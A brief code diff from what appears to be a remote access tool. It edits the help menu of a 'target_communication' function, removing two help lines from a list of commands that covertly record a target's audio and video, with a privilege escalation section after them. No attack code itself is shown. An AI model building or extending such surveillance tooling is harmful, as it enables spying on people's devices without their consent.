@@ -84,8 +84,6 @@ def target_communication():
     print("   stop_audio             - Stop audio recording")
     print("   start_video            - Start video recording only")
     print("   stop_video             - Stop video recording")
-    print("   start_recording        - Start both audio & video")
-    print("   stop_recording         - Stop both audio & video")
     print("   list_recordings        - List recorded files")
     print("")
     print("PRIVILEGE ESCALATION:")
